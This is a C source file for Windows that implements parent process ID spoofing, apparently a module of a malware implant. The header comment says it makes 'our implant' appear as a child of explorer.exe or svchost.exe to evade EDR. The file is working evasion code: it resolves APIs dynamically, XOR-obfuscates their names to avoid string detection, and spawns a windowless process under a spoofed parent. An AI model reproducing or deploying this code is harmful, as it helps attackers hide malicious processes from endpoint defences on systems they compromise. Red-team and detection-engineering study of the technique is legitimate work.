/*
 * PPID Spoofing
 *
 * Uses CreateProcessA with EXTENDED_STARTUPINFO_PRESENT and
 * PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to make the new process
 * appear as a child of a legitimate system process.
 *
 * Example: our implant appears as child of explorer.exe or svchost.exe
 * instead of cmd.exe/powershell.exe — much less suspicious to EDR.
 */

#include "ppid_spoof.h"
#include "winapi.h"
#include "obfstr.h"

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

typedef BOOL (WINAPI *fnInitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
typedef BOOL (WINAPI *fnUpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
typedef void (WINAPI *fnDeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
typedef BOOL (WINAPI *fnCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

static DWORD FindPidByName(const char *name) {
    HANDLE hSnap = g_Api.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (g_Api.pProcess32FirstW(hSnap, &pe)) {
        do {
            char narrow[MAX_PATH];
            for (int i = 0; i < MAX_PATH && pe.szExeFile[i]; i++) {
                narrow[i] = (char)pe.szExeFile[i];
                if (!pe.szExeFile[i]) break;
            }
            narrow[MAX_PATH - 1] = 0;
            if (_stricmp(narrow, name) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (g_Api.pProcess32NextW(hSnap, &pe));
    }

    g_Api.pCloseHandle(hSnap);
    return pid;
}

BOOL SpawnWithSpoofedParent(const char *exe_path, const char *parent_name, PPROCESS_INFORMATION pi) {
    DWORD parent_pid = FindPidByName(parent_name);
    if (!parent_pid) return FALSE;

    /* Open parent process */
    HANDLE hParent = g_Api.pOpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!hParent) return FALSE;

    /* Resolve attribute list functions via obfuscated string */
    char s_k32[OBF_KERNEL32_LEN];
    deobf(s_k32, OBF_KERNEL32, OBF_KERNEL32_LEN);
    HMODULE k32 = g_Api.pGetModuleHandleA(s_k32);
    SecureZeroMemory(s_k32, sizeof(s_k32));
    if (!k32) { g_Api.pCloseHandle(hParent); return FALSE; }

    /* Obfuscated function names for attribute list APIs */
    static const unsigned char OBF_IPTAL[] = {
        0x1C,0x3B,0x3C,0x21,0x3C,0x34,0x39,0x3C,0x2F,0x30,0x05,0x27,0x3A,0x36,0x01,0x3D,
        0x27,0x30,0x34,0x31,0x14,0x21,0x21,0x27,0x3C,0x37,0x20,0x21,0x30,0x19,0x3C,0x26,
        0x21,0x55
    };
    char s_iptal[34]; deobf(s_iptal, OBF_IPTAL, 34);
    fnInitializeProcThreadAttributeList pInit =
        (fnInitializeProcThreadAttributeList)g_Api.pGetProcAddress(k32, s_iptal);
    SecureZeroMemory(s_iptal, sizeof(s_iptal));

    static const unsigned char OBF_UPTA[] = {
        0x00,0x25,0x31,0x34,0x21,0x30,0x05,0x27,0x3A,0x36,0x01,0x3D,0x27,0x30,0x34,0x31,
        0x14,0x21,0x21,0x27,0x3C,0x37,0x20,0x21,0x30,0x55
    };
    char s_upta[26]; deobf(s_upta, OBF_UPTA, 26);
    fnUpdateProcThreadAttribute pUpdate =
        (fnUpdateProcThreadAttribute)g_Api.pGetProcAddress(k32, s_upta);
    SecureZeroMemory(s_upta, sizeof(s_upta));

    static const unsigned char OBF_DPTAL[] = {
        0x11,0x30,0x39,0x30,0x21,0x30,0x05,0x27,0x3A,0x36,0x01,0x3D,0x27,0x30,0x34,0x31,
        0x14,0x21,0x21,0x27,0x3C,0x37,0x20,0x21,0x30,0x19,0x3C,0x26,0x21,0x55
    };
    char s_dptal[30]; deobf(s_dptal, OBF_DPTAL, 30);
    fnDeleteProcThreadAttributeList pDelete =
        (fnDeleteProcThreadAttributeList)g_Api.pGetProcAddress(k32, s_dptal);
    SecureZeroMemory(s_dptal, sizeof(s_dptal));

    fnCreateProcessA pCreateProcessA = g_Api.pCreateProcessA;

    if (!pInit || !pUpdate || !pDelete || !pCreateProcessA) {
        g_Api.pCloseHandle(hParent);
        return FALSE;
    }

    /* Initialize attribute list */
    SIZE_T attr_size = 0;
    pInit(NULL, 1, 0, &attr_size);

    LPPROC_THREAD_ATTRIBUTE_LIST attr_list =
        (LPPROC_THREAD_ATTRIBUTE_LIST)g_Api.pVirtualAlloc(NULL, attr_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!attr_list) { g_Api.pCloseHandle(hParent); return FALSE; }

    if (!pInit(attr_list, 1, 0, &attr_size)) {
        g_Api.pVirtualFree(attr_list, 0, MEM_RELEASE);
        g_Api.pCloseHandle(hParent);
        return FALSE;
    }

    /* Set parent process attribute */
    if (!pUpdate(attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hParent, sizeof(HANDLE), NULL, NULL)) {
        pDelete(attr_list);
        g_Api.pVirtualFree(attr_list, 0, MEM_RELEASE);
        g_Api.pCloseHandle(hParent);
        return FALSE;
    }

    /* Create process with spoofed parent */
    STARTUPINFOEXA si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.lpAttributeList = attr_list;

    BOOL result = pCreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, (LPSTARTUPINFOA)&si, pi);

    /* Cleanup */
    pDelete(attr_list);
    g_Api.pVirtualFree(attr_list, 0, MEM_RELEASE);
    g_Api.pCloseHandle(hParent);

    return result;
}
